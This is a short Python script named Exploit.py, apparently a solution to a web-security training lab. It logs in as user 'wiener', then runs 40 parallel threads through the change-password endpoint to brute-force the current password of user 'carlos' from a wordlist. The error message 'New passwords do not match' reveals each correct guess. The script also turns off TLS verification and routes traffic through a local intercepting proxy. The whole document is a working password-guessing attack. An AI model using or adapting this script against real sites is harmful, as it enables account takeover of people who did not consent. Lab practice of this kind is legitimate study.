import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if(len(sys.argv) != 2):
    print("USAGE: Exploit.py <url>")
    sys.exit(1)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = sys.argv[1]

def post_req(url,data,headers,passwd):
    r = requests.post(url,data=data,headers=headers,proxies=proxies,verify=False)
    print("testing: {0}".format(passwd),end="\r",flush=True)
    if("New passwords do not match" in r.text):
        print(r.cookies)
        print(passwd)
    return r

r1 = requests.get(url+'login')
temp_cookie = r1.cookies['session']

headers = {'Cookie':'session='+temp_cookie}
data = {'username':'wiener','password':'test'}

r2 = requests.post(url+'login',data=data,headers=headers,proxies=proxies,verify=False,allow_redirects=False)

cookie_value = r2.cookies['session']



file1 = open('creds/passwords1','r')
passwords = file1.readlines()

processes = []
i = 1
with ThreadPoolExecutor(max_workers=40) as executor:
    for passwd in passwords:
        print("{0}".format(i),end="\r",flush=True)
        headers = {'Cookie':'session='+cookie_value}
        data = {'username':'carlos','current-password':passwd[:-1],'new-password-1':'qwe','new-password-2':'tyuui'}
        processes.append(executor.submit(post_req,url+'my-account/change-password',data,headers,passwd))
        i= i + 1


